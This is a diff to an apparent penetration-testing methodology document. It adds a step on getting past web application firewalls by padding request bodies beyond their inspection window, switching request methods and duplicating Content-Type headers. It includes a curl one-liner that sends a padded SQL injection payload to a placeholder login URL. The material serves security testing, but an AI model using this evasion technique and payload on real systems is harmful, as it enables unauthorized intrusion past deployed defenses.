@@ -81,7 +81,20 @@ chains_with: [http-smuggling, parameter-pollution, auth-bypass, broken-access-co
    The finding is a path the proxy authorizes/blocks under one normalization while the origin
    resolves it to a different, access-controlled resource.
 
-7. **Confirm the disagreement, not just the odd response.** For every candidate, show the two
+7. **Body-size inspection window (nowafpls) + method/header multiplicity.** Most commercial
+   WAFs only inspect the first N KB of a body (8-128 KB by tier), so padding benign filler past
+   that window slips the real payload past inspection while the backend still parses the whole
+   body. Also flip the method (a blocked `GET` param re-sent as a `POST` body, or vice-versa)
+   and send a duplicate same-name `Content-Type` (edge reads the first, backend the last). The
+   engine builds the oversized body for you:
+   ```bash
+   # engine/defense_evasion.py: WAFBypassEngine().generate_oversized_body(payload, pad_to=65536)
+   # pad to 8/16/32/64/128 KB; set Content-Length to the real total; keep filler benign (A/space)
+   python3 -c "from engine.defense_evasion import oversized_body_pad as p; print(p(\"' OR 1=1--\", 65536))" \
+     | curl -s -i -X POST --data-binary @- -H 'Content-Type: application/x-www-form-urlencoded' https://target/login
+   ```
+
+8. **Confirm the disagreement, not just the odd response.** For every candidate, show the two
    layers reached *different* conclusions on the *same* bytes — e.g. the WAF logged/blocked value
    X while the application acted on value Y, or the proxy 403'd one spelling while another reached
    a protected handler.
